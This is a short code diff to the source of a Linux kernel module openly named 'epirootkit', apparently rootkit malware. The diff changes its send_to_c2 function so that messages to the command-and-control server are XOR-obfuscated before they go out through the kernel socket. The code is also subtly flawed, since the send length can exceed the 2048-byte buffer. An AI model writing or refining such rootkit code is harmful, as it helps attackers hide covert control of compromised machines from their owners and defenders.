@@ -86,13 +86,20 @@ static int send_to_c2(const char *msg, size_t len) {
     struct kvec iov;
     struct msghdr msg_hdr = {0};
     int sent;
+    char encrypted[2048];
+    int i;
 
     if (!g_sock) {
         printk(KERN_ERR "epirootkit: Not connected, cannot send\n");
         return -ENOTCONN;
     }
 
-    iov.iov_base = (char *)msg;
+    // Encrypt the message before sending
+    for (i = 0; i < len && i < sizeof(encrypted); i++) {
+        encrypted[i] = msg[i] ^ config.xor_key[i % strlen(config.xor_key)];
+    }
+
+    iov.iov_base = encrypted;
     iov.iov_len = len;
 
     sent = kernel_sendmsg(g_sock, &msg_hdr, &iov, 1, len);
@@ -289,3 +296,4 @@ static void __exit epirootkit_exit(void) {
 
 module_init(epirootkit_init);
 module_exit(epirootkit_exit);
+
